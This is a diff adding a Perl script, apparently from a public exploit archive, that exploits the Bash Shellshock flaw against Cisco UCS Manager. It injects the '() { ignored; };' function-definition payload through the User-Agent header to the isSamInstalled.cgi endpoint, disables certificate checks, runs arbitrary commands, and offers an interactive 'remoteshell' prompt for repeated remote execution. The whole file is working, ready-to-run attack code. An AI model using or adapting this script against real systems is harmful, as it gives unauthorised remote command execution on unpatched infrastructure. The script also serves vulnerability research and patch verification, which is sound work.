@@ -1,0 +1,152 @@
+#!/usr/bin/perl
+# Don Anto (c) IPSECS 2014
+use strict;
+use warnings;
+use LWP::UserAgent;
+use Getopt::Long;
+
+sub usage
+{
+  print "
+ GNU Bash Shellshock Exploit Cisco UCS 
+ Usage :
+ [--help|-h] 		- This help
+ [--ssl|-s]		- HTTPS/SSL target
+ [--port|-p]		- Specify non-standard port (default ssl:443 & non-ssl:80) 
+ [--target|-t]  	- Specify IP target (must specify - mandatory parameter)
+ [--command|-c] 	- Specify command to execute (must specify - mandatory parameter)
+ [--interact|-i] 	- Interactive mode
+
+ Example:
+  perl shellshock.pl -t 1.2.3.41 -c /usr/bin/id --ssl
+  perl shellshock.pl -t 1.2.3.42 -c \"uname -a\" -p 8080
+  perl shellshock.pl -t 1.2.3.43 -i
+ \n";
+}
+
+sub validateCmd 
+{
+  my ($cmd) = @_;
+  my @array=split(/ /, $cmd);
+  my $i=0;
+  for ($i=0; $i < @array; $i++) {
+    if($i==0) {
+      if ($array[0] =~ m/\/\w+\/\w+/){
+        $array[0]=$array[0];
+      } else {
+        $array[0]=`which $array[0]`;
+        chomp($array[0]);
+      }
+    }
+  }
+  my $ret = join(" ", @array) . "\n";
+  chomp($ret);
+  return $ret;
+}
+
+sub requestsrv
+{
+  my $TMPFILE="/tmp/shellshock.txt";
+  my $flags=0;
+  my ($ipaddr,$protoaddr,$portaddr,$cmdaddr) = @_ ; 
+  my $cmd="() { ignored; }; echo; echo bash_shellshock_start:; $cmdaddr; echo bash_shellshock_end:";
+  my $ua = LWP::UserAgent->new(timeout => 30, keep_alive => 1);
+  $ua->ssl_opts(verify_hostname => 0 ,SSL_verify_mode => 0x00);
+  $ua->agent($cmd);
+  my $url = "$protoaddr://$ipaddr:$portaddr/ucsm/isSamInstalled.cgi";
+  my $response = $ua->get($url);
+  
+  my @result = $response->as_string;
+  if(!$response->is_success) {
+    print @result;
+    die;
+  }
+  open(TMPFILE, ">$TMPFILE");
+  print TMPFILE @result;
+  close(TMPFILE);
+  open(TMPFILE, "<$TMPFILE");
+  
+  my ($line,@all_lines);
+  chop(@all_lines=<TMPFILE>);
+  foreach $line (@all_lines) {
+    if ($line =~ /bash_shellshock_start/){
+      $flags=1;
+    }
+    if ($flags == 1){
+      if ($line !~ /bash_shellshock/){
+        print $line . "\n";
+      }
+      if ($line =~ /bash_shellshock_end/){
+        $flags=0;
+      }
+    }
+  }
+  close(TMPFILE);
+  unlink($TMPFILE);
+}
+
+MAIN:
+{
+  if(!$ARGV[2]){
+    usage();
+    exit;
+  }
+  my ($help,$ssl,$port,$proto,$dstport,$target,$command,$interact,$icmd);
+  GetOptions(
+  'help' => \$help,
+  'ssl' => \$ssl,
+  'port=s' => \$port,
+  'target=s' => \$target,
+  'command=s' => \$command,
+  'interact' => \$interact,
+  ) or die "Invalid options!! Try --help for details.\n";
+  if($help) {
+    usage();
+    exit;
+  }
+
+  if((!$target || (!$ARGV[3] && !$interact)) && (!$target || (!$interact && !$command))){
+    usage();
+    exit();
+  }
+
+  if($port) {
+    if($ssl) {
+      $proto="https";
+      $dstport=$port;
+    }
+    else {
+      $proto="http";
+      $dstport=$port;
+    }
+  }
+  else {
+    if($ssl) {
+      $proto="https";
+      $dstport=443;
+    }
+    else {
+      $proto="http";
+      $dstport=80;
+    }
+  }
+  if(!$interact){
+    requestsrv($target,$proto,$dstport,validateCmd($command));
+  }
+  else {
+    while(1) {
+      ishell:
+      print "remoteshell ~> ";
+      $|++;
+      chop($icmd = <STDIN>);
+      if($icmd eq "quit" || $icmd eq "exit"){
+        exit;
+      }elsif($icmd eq ""){
+        goto ishell;
+      }else{
+        requestsrv($target,$proto,$dstport,validateCmd($icmd));
+      }
+    }
+  }
+}
+
